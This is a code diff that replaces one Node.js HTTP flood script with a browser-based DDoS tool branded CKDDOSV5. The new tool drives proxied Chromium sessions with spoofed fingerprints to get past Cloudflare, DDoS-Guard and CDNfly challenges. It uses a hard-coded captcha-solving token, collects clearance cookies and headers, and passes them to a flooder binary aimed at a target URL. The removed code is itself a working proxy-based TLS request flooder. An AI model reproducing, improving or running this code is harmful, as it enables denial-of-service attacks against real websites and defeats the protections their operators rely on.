@@ -1,196 +1,606 @@
-//developer by wizwhopper
-const net = require('net');
+
+
+const { chromium } = require('playwright-extra');
+const { FingerprintGenerator } = require('fingerprint-generator');
+const { FingerprintInjector } = require('fingerprint-injector');
+const { spawn } = require('child_process');
+const { UAParser } = require('ua-parser-js');
+const argv = require('minimist')(process.argv.slice(2));
+const colors = require('colors');
+const path = require('path');
 const fs = require('fs');
-const url = require('url');
-const request_2 = require('request');
-const { constants } = require('crypto');
-var theJar = request_2.jar();
-const path = require("path");
-const http = require('http');
-const tls = require('tls');
-const execSync = require('child_process').execSync;
+const captcha = require('puppeteer-extra-plugin-recaptcha')
 
-var VarsDefinetions = {
-Objetive: process.argv[4],
-MethodRequest: process.argv[2],
-time: process.argv[5],
-process_count: process.argv[3],
-rate:process.argv[6]
+
+function log(string) {
+    let d = new Date();
+    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
+    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
+    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
+    console.log(`(${hours}:${minutes}:${seconds})`.white + ` - ${string}`);
 }
-try {
 
-    var colors = require('colors');
 
-} catch (err) {
+/* 
+    * Loading custom addons
+    * See documentation for more information.
+*/
 
-    console.log(' Download the colors module');
-    execSync('npm install colors');
-    console.log('upload saxossful');
-    process.exit();
+const addons = {
+    cloudflare: './data/cloudflare.js',
+    
+};
+
+function checkAddonLoaded() {
+    let loadedCount = 0;
+    let totalCount = 0;
+
+    for (const addonName in addons) {
+        if (addons.hasOwnProperty(addonName)) {
+            try {
+                const addon = require(addons[addonName]);
+                if (typeof addon.initialize === 'function') {
+                    global[addonName] = addon;
+                    addon.initialize();
+                    loadedCount++;
+                } else {
+                    log(`(${'V5新增绕过3种模式'.red}) Incorrect addon -> ` + `${addonName}`.red);
+                }
+            } catch (error) {
+                log(`(${'V5新增绕过3种模式'.red}) Unable to load addon -> ` + `${addonName}`.red + ` | ` + `${error.message}`.red);
+            }
+            totalCount++;
+        }
+    }
+    log(`(${'V5新增绕过3种模式'.magenta}) Correctly loaded ${`${loadedCount}`.magenta}/${`${totalCount}`.magenta} addons. `);
 }
+
+checkAddonLoaded();
+
+
 var fileName = __filename;
 var file = path.basename(fileName);
-try {
 
-    var proxies = fs.readFileSync('http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
-	var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'); //Put your https proxies and useragents
+if (process.argv.includes('-h') || process.argv.includes('--help')) {
+    console.log(`
 
-} catch (err) {
+  Usage: node ${file} [options] <params>
 
-    if (err.code !== 'ENOENT') throw err;
-    console.log('Install https.txt proxies to hit https sites http.txt to hit http sites.');
-    console.log('example: node CFH.js GET 4 https://anonfiles.com/ 45 64');
+  ${'Options:'.brightWhite}
+
+    ${'*'.cyan} TARGET           Target URL
+    ${'*'.cyan} TIME             Attack duration
+    ${'*'.cyan} SESSIONS         Number of browser sessions (threads)
+    ${'*'.cyan} RATE             Requests per IP
+    ${'*'.cyan} PROXY            Proxy file
+
+  ${'Optional:'.brightWhite}
+
+    ${'--system'.cyan}, ${'-s'.cyan}       Choice of operating system '${"linux, windows, random".cyan}'
+    ${'--debug'.cyan}, ${'-d'.cyan}        Debug information (Errors) '${"true, false".cyan}'
+
+  ${'Examples:'.brightWhite}
+
+  ${'–'.gray} Standard launch with options without xvfb
+    ${('$ node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt').cyan}
+  ${'–'.gray} Standard launch with options with xvfb
+    ${('$ xvfb-run node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt').cyan} 
+  ${'–'.gray} Standard launch with options with optional param
+    ${('$ xvfb-run node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt --system=random').cyan} 
+    ${'–'.gray} Standard launch with options with several optional params
+    ${('$ xvfb-run node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt --system=windows --debug=true').cyan} 
+
+  ${'Authors:'.brightWhite}
+  ${'–'.gray} ${'t.me/ckddos'.cyan} - @CKDDOS
+
+`);
 
     process.exit();
 }
-process.on('uncaughtException', function() {});
-process.on('unhandledRejection', function() {});
-require('events').EventEmitter.defaultMaxListeners = Infinity;
-function getRandomNumberBetween(min,max){
-    return Math.floor(Math.random()*(max-min+1)+min);
+
+if (process.argv.length < 7) {
+    console.log(`- @CKDDOSV5-BROWSER \nNo arguments provided. Use node ${file} --help to see usage information`)
+    process.exit();
 }
-function RandomString(length) {
-  var result           = '';
-  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  var charactersLength = characters.length;
-  for ( var i = 0; i < length; i++ ) {
-     result += characters.charAt(Math.floor(Math.random() * charactersLength));
-  }
-  return result;
+
+const urlT = process.argv[2];
+const timeT = process.argv[3];
+const threadsT = process.argv[4];
+const rateT = process.argv[5];
+const proxyT = process.argv[6];
+var systemT = argv["system"] || argv["s"] || 'windows';
+var debugT = argv["debug"] || argv["d"] || false;
+
+// Just don't touch it :)
+if (typeof debugT === 'string') {
+    debugT = debugT === 'true';
 }
-var parsed = url.parse(VarsDefinetions.Objetive);
-process.setMaxListeners(15);
-let browser_saves = '';
 
-const cluster = require('cluster');
- const { cpus } = require('os');
-
-// // const numCPUs = cpus().length;
-const numCPUs = VarsDefinetions.process_count;
-
-if (cluster.isPrimary) {
-
-  for (let i = 0; i < numCPUs; i++) {
-    cluster.fork();
-  }
-
-  cluster.on('exit', (worker, code, signal) => {
-    console.log(`h pipa: ${worker.process.pid} pai8ane`);
-  });
+if (debugT === true) {
+    process.on('uncaughtException', function (error) {
+        console.log(error)
+    });
+    process.on('unhandledRejection', function (error) {
+        console.log(error)
+    })
 } else {
-
-function BuildRequest() {
-let path = parsed.path;
-if (path.indexOf("[rand]") !== -1){
-	path = path.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,16)));
+    process.on('uncaughtException', function (error) {
+        // console.log(error)
+    });
+    process.on('unhandledRejection', function (error) {
+        // console.log(error)
+    })
 }
 
-var raw_socket = `${VarsDefinetions.MethodRequest} `+
-path+
-' HTTP/1.2\r\nHost: '+parsed.host+'\r\nReferer: '+
-VarsDefinetions.Objetive+'\r\nOrigin: '+
-VarsDefinetions.Objetive+
-'\r\nAccept: */*\r\nuser-agent: '+
- UAs[Math.floor(Math.random() * UAs.length)] +
- '\r\nUpgrade-Insecure-Requests: 1\r\n'+
- 'Accept-Encoding: *\r\n'+
- 'Accept-Language: en-US,en;q=0.9\r\n'+
- 'Cache-Control: max-age=0\r\n'+
+const systemsT = ['windows', 'linux']
 
- 'Connection: Keep-Alive\r\n\r\n'
-return raw_socket;
+if (systemT !== 'windows' && systemT !== 'linux' && systemT !== 'random') {
+    systemT = 'windows';
 }
 
-setInterval(function() {
+const proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n')
 
-var aa = getRandomNumberBetween(100, proxies.length-400);
 
-var proxy = proxies[Math.floor(Math.random() * aa)];
-proxy = proxy.split(':');
-
-const agent = new http.Agent({
-keepAlive: true,
-keepAliveMsecs: 12500,
-maxSockets: Infinity,
-});
-
-var tlsSessionStore = {};
-
-var req = http.request({
-    host: proxy[0],
-    agent: agent,
-    globalAgent: agent,
-    port: proxy[1],
-      headers: {
-    'Host': parsed.host,
-    'Proxy-Connection': 'Keep-Alive',
-    'Connection': 'Keep-Alive',
-    
-  },
-    method: 'CONNECT',
-    path: parsed.host+':443'
-}, function(){ 
-    req.setSocketKeepAlive(true);
- });
-
-req.on('connect', function (res, socket, head) {//open raw request
-    tls.authorized = true;
-    tls.sync = true;
-    var TlsConnection = tls.connect({
-        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
-        secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
-        honorCipherOrder: true,
-        requestCert: true,
-        host: parsed.host,
-        port: 443,
-        secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv2,
-        servername: parsed.host,
-        secure: true,
-        rejectUnauthorized: false,
-        socket: socket
-    }, function () {
-
-for (let j = 0; j < VarsDefinetions.rate; j++) {
-
-TlsConnection.setKeepAlive(true, 17500)
-TlsConnection.setTimeout(19500);
-var r = BuildRequest();
-TlsConnection.write(r);
-TlsConnection.write(`${VarsDefinetions.MethodRequest} `+VarsDefinetions.Objetive+' HTTP/1.2\r\nHost: '+parsed.host+'\r\nReferer: '+VarsDefinetions.Objetive+'\r\nOrigin: '+VarsDefinetions.Objetive+'\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
-
+function randomIntFromInterval(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
-});
 
-TlsConnection.on('disconnected', () => {
-    TlsConnection.destroy();
-});
 
-TlsConnection.on('timeout' , () => {
-    TlsConnection.destroy();
-});
+function randomElement(element) {
+    return element[Math.floor(Math.random() * element.length)];
+}
 
-TlsConnection.on('error', (err) =>{
-    TlsConnection.destroy();
-});
 
-TlsConnection.on('data', (chunk) => {
-    setTimeout(function () { 
-        TlsConnection.abort(); 
-        return delete TlsConnection
-    }, 950000); 
-});
 
-    TlsConnection.on('end', () => {
-      TlsConnection.abort();
-      TlsConnection.destroy();
+async function flooder(proxy, headerEntries, cookies) {
+    const fArgs = [
+        '-p', proxy,
+        '-u', urlT,
+        '-r', rateT,
+        '-t', 12000,
+        '-d', timeT
+    ].concat(...headerEntries.map(entry => ['-h', `${entry[0]}@${entry[1]}`])).concat([
+        '-h',
+        `cookie@${cookies.length > 0 ? cookies : 'test@1'}`,
+        '-h',
+        'referer@' + urlT,
+    ])
+
+    var starts = spawn('./ckddosv5-kk', fArgs, { stdio: 'inherit', detached: false });
+    starts.on('exit', (err, signal) => { starts.kill() });
+}
+
+
+
+/* 
+    * Function called for create new instance of chromium browser with parametres "proxy" that we got from fingerprint.
+    * It uses virtual screen for emulating. (Needed xvfb-run <<<params>>>)
+*/
+
+async function solver(proxy) {
+    log(`(${'CKDDOSV5-BROWSER'.brightBlue}) New browser instance -> ` + `Chromium (${proxy})`.brightBlue)
+
+    var parts = proxy;
+    parts = parts.split(':');
+
+    const fingerprintGenerator = new FingerprintGenerator();
+
+    var browserFingerprintWithHeaders;
+
+    if (systemT === 'random') {
+        browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
+            browsers: [
+                { name: 'chrome' }
+            ],
+            operatingSystems: [
+                randomElement(systemsT)
+            ]
+        });
+    } else {
+        browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
+            browsers: [
+                { name: 'chrome' }
+            ],
+            operatingSystems: [
+                systemT
+            ]
+        });
+    }
+
+    fingerprintGenerator.getFingerprint();
+
+    const fingerprintInjector = new FingerprintInjector();
+    const { fingerprint } = browserFingerprintWithHeaders;
+
+    const userAgent = fingerprint.navigator.userAgent;
+    const locales = fingerprint.navigator.language;
+
+    const browser = await chromium.launch({
+        headless: false,
+        javaScriptEnabled: true,
+        permissions: ['camera', 'microphone'],
+        proxy: { server: 'http://' + proxy },
+        args: [
+            '--disable-blink-features=AutomationControlled',
+            '--disable-features=IsolateOrigins,site-per-process',
+            '--use-fake-device-for-media-stream',
+            '--use-fake-ui-for-media-stream',
+            '--no-sandbox',
+            '--enable-experimental-web-platform-features',
+            '--disable-dev-shm-usage',
+            '--disable-software-rastrizier',
+            '--user-agent=' + userAgent,
+            '--viewport-size 1920, 1080',
+            '--enable-features=NetworkService',
+            '--color-scheme=' + randomElement(['dark', 'light'])
+        ],
+        ignoreDefaultArgs: ['--enable-automation'],
     });
 
-}).end()
-}, 0);
+    const context = await browser.newContext({ locale: locales, viewport: { width: 1920, height: 1080 }, deviceScaleFactor: 1 });
+
+    const page = await context.newPage();
+
+    await page.setDefaultNavigationTimeout(0);
+
+    await page.setViewportSize({ width: 1920, height: 1080 });
+    await page.emulateMedia({ colorScheme: 'dark' })
+
+    const parser = new UAParser();
+    parser.setUA(userAgent);
+    const result = parser.getResult();
+
+    await context.addInitScript(args => {
+        (function () {
+            const ua = args.ua;
+            const os = args.os;
+
+            const userAgentData = Object.create(NavigatorUAData.prototype)
+            const brands = [{
+                "brand": " Not A;Brand",
+                "version": "24"
+            }, {
+                "brand": "Chromium",
+                "version": ua.major
+            }, {
+                "brand": "Google Chrome",
+                "version": ua.major
+            }]
+            Object.defineProperty(userAgentData, 'brands', {
+                get: function () {
+                    return brands
+                }
+            })
+            Object.defineProperty(userAgentData, 'mobile', {
+                get: function () {
+                    return false
+                }
+            })
+            Object.defineProperty(userAgentData, 'platform', {
+                get: function () {
+                    return os.name
+                }
+            })
+
+            NavigatorUAData.prototype.getHighEntropyValues = function (hints) {
+                if (hints.length == 0)
+                    return {}
+
+                let hint = {
+                    brands,
+                    mobile: false,
+                    platform: os.name,
+                }
+
+                const getters = {
+                    architecture: function () {
+                        return {
+                            architecture: 'x86'
+                        }
+                    },
+                    bitness: function () {
+                        return {
+                            bitness: '64'
+                        }
+                    },
+                    model: function () {
+                        return ''
+                    },
+                    platformVersion: function () {
+                        return {
+                            platform: os.name,
+                            platformVersion: os.version
+                        }
+                    },
+                    uaFullVersion: function () {
+                        return {
+                            uaFullVersion: ua.version
+                        }
+                    },
+                    fullVersionList: function () {
+                        return {
+                            fullVersionList: this.brands
+                        }
+                    }
+                }
+
+                for (let h in hints) {
+                    if (getters[hints[h]] != null)
+                        Object.assign(hint, getters[hints[h]]())
+                }
+                return hint
+            }
+            Object.defineProperty(window.navigator, 'userAgentData', {
+                get: function () {
+                    return userAgentData
+                }
+            });
+        })()
+    }, {
+        ua: result.browser,
+        os: result.os
+    });
+
+
+    try {
+        await page.addInitScript(() => {
+            ['height', 'width'].forEach(property => {
+                const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
+                Object.defineProperty(HTMLImageElement.prototype, property, {
+                    ...imageDescriptor,
+                    get: function () {
+                        if (this.complete && this.naturalHeight == 0) {
+                            return 20;
+                        }
+                        return imageDescriptor.get.apply(this);
+                    },
+                });
+            });
+
+            Object.defineProperty(Notification, 'permission', {
+                get: function () {
+                    return 'default';
+                }
+            });
+
+            Object.defineProperty(navigator, 'pdfViewerEnabled', {
+                get: () => true,
+            });
+
+            Object.defineProperty(navigator.connection, 'rtt', {
+                get: () => 150,
+            });
+
+            Object.defineProperty(navigator, 'share', {
+                get: () => false,
+            });
+
+            Object.defineProperty(navigator, 'bluetooth', {
+                get: () => true,
+            });
+
+        })
+
+        await page.addInitScript(() => {
+            Object.defineProperty(navigator, 'keyboard', {
+                get: function () {
+                    return true;
+                }
+            });
+            Object.defineProperty(navigator, 'mediaCapabilities', {
+                get: function () {
+                    return true;
+                }
+            });
+            Object.defineProperty(navigator, 'mediaDevices', {
+                get: function () {
+                    return true;
+                }
+            });
+            Object.defineProperty(navigator, 'mediaSession', {
+                get: function () {
+                    return true;
+                }
+            });
+            Object.defineProperty(navigator, 'oscpu', {
+                get: function () {
+                    return 'Windows (Win32)';
+                }
+            });
+            Object.defineProperty(navigator, 'platform', {
+                get: function () {
+                    return 'Win32';
+                }
+            });
+            Object.defineProperty(navigator, 'product', {
+                get: function () {
+                    return 'Gecko';
+                }
+            });
+            Object.defineProperty(navigator, 'productSub', {
+                get: function () {
+                    return '20100101';
+                }
+            });
+            Object.defineProperty(navigator, 'vendor', {
+                get: function () {
+                    return 'Google Inc.';
+                }
+            });
+        });
+    } catch (err) { }
+
+
+    await page.route('***', route => {
+        route.continue();
+    });
+
+    const captchaoptions = {
+        visualFeedback: true,
+        provider: {
+            id: '2captcha',
+            token: 'dcd172dae04be6a8f95c5a0ca23443e4',
+        },
+    }
+    chromium.use(captcha(captchaoptions))
+
+    const response = await page.goto(urlT, { locale: locales, deviceScaleFactor: 1 });
+
+    await page.waitForTimeout(11000);
+
+    const status = await response.status();
+
+    try {
+        if (![200, 404].includes(status)) {
+            const title = await page.title();
+
+            if (title === 'Access denied' || title === 'Attention Required! | Cloudflare') {
+                await browser.close();
+                await context.close();
+
+                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
+                solver(proxyN);
+            }
+
+
+            // Looking for CloudFlare JS
+            if (title === 'Just a moment...') {
+
+                const resultCloudFlare = await cloudflare.captchaSolver(page, context, response)
+
+                const receivedTitle = resultCloudFlare[0]           // Page title
+                const receivedCookies = resultCloudFlare[1]         // Page cookies
+                const receivedHeaderEntries = resultCloudFlare[2]   // Headers for flooder
+
+                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(receivedTitle !== "") ? receivedTitle : "[ ] Title is empty"}`.magenta);
+                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(receivedCookies !== "") ? receivedCookies : "[ ] Cookies is empty"}`.magenta);
+
+                // Starting a new instance of the flooder
+                flooder(proxy, receivedHeaderEntries, receivedCookies);
+
+                await browser.close();
+                await context.close();
+
+                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
+                solver(proxyN);
+
+
+            } else if (await page.content().includes('/.well-known/ddos-guard/check?context=free_splash')) {
+                const resultDDosGuard = await ddosguard.captchaSolver(page, context, response)
+
+                const receivedTitle = resultDDosGuard[0]           // Page title
+                const receivedCookies = resultDDosGuard[1]         // Page cookies
+                const receivedHeaderEntries = resultDDosGuard[2]   // Headers for flooder
+
+                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(receivedTitle !== "") ? receivedTitle : "[ ] Title is empty"}`.magenta);
+                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(receivedCookies !== "") ? receivedCookies : "[ ] Cookies is empty"}`.magenta);
+
+                // Starting a new instance of the flooder
+                flooder(proxy, receivedHeaderEntries, receivedCookies);
+
+                await browser.close();
+                await context.close();
+
+                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
+                solver(proxyN);
+
+
+            } else {
+                log(`(${'CKDDOSV5-BROWSER'.green}) No Detect protection ` + `(JS/Captcha)`.green);
+
+                await page.waitForTimeout(1000);
+
+                const title = await page.title();
+                const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');
+                const headers = await response.request().allHeaders();
+                const headerEntries = Object.entries(headers);
+
+                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.magenta);
+                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.magenta);
+
+                // Starting a new instance of the flooder
+                flooder(proxy, headerEntries, cookies);
+
+                await browser.close();
+                await context.close();
+
+                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
+                solver(proxyN);
+            }
+
+
+
+        } else if (await page.locator('//*[@id="slider"]/div[1]')) {
+            await page.waitForTimeout(1000);
+
+            const resultCDNfly = await cdnfly.sliderSolver(page, context, response)
+
+            const receivedTitle = resultCDNfly[0]           // Page title
+            const receivedCookies = resultCDNfly[1]         // Page cookies
+            const receivedHeaderEntries = resultCDNfly[2]   // Headers for flooder
+
+            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(receivedTitle !== "") ? receivedTitle : "[ ] Title is empty"}`.magenta);
+            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(receivedCookies !== "") ? receivedCookies : "[ ] Cookies is empty"}`.magenta);
+
+            // Starting a new instance of the flooder
+            flooder(proxy, receivedHeaderEntries, receivedCookies);
+
+            await browser.close();
+            await context.close();
+
+            const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
+            solver(proxyN);
+
+
+        } else {
+            log(`(${'CKDDOSV5-BROWSER'.green}) No Detect protection ` + `(JS/Captcha)`.green);
+
+            await page.waitForTimeout(1000);
+
+            const title = await page.title();
+            const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');
+            const headers = await response.request().allHeaders();
+            const headerEntries = Object.entries(headers);
+
+            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.magenta);
+            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.magenta);
+
+            // Starting a new instance of the flooder
+            flooder(proxy, headerEntries, cookies);
+
+            await browser.close();
+            await context.close();
+
+            const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
+            solver(proxyN);
+        }
+    } catch (e) {
+        //  console.log(e)
+
+        const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
+        solver(proxyN);
+
+        await browser.close();
+        await context.close();
+    }
 }
 
-setTimeout(() => {
-  process.exit(1);
-}, VarsDefinetions.time*1000)
 
-console.log('HHARD PORN STARTEDDDDD ：'+VarsDefinetions.Objetive+' GIA：'+VarsDefinetions.time);
+async function sessionIn() {
+    for (let i = 0; i < threadsT; i++) {
+        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+
+        solver(proxy);
+    }
+}
+
+function main() {
+    sessionIn();
+}
+
+main();
+
+setTimeout(() => {
+    process.exit(-1);
+    starts.kill(-1);
+}, timeT * 1000)
